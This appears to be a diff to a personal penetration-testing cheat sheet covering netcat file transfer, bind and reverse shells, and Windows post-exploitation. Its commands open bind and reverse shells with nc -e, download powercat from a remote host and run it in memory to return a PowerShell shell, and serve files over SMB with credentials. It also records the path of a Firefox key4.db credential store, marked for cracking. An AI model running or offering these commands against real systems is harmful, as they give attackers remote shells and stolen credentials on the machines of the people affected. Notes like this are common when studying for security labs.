@@ -1,3 +1,28 @@
+# netcat
+#### file transfer
+target machine:
+`nc -nlvp 9001 > incoming.exe`
+local machine:
+`nc -nv IP.ADDR 9001 < EXAMPLE.exe`
+(note: no output, must guess when upload complete)
+
+#### bind shell
+target:
+`nc -lnvp 9001 -e cmd.exe`
+local:
+`nc -nv IP.ADDR 9001`
+
+#### reverse shell
+target:
+`nc -nv IP.ADDR 9001 -e /bin/bash`
+local:
+`nc -lnvp 9001`
+
+# socat
+connect
+`socat - TX`
+
+# windows
 ## one-liners
 #### dir and file
 list all files current dir
@@ -27,9 +52,6 @@ download file
 download a file and execute from memory with powercat
 `IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`
 
-
-
-
 ## smb
 localhost
 `sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1
@@ -41,15 +63,12 @@ New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.1
 cd dials:
 ```
 
-
-
 ## credentials
 ```
 C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
 ```
 sharpweb?
 python cracker?
-
 
 ## file transfer
 
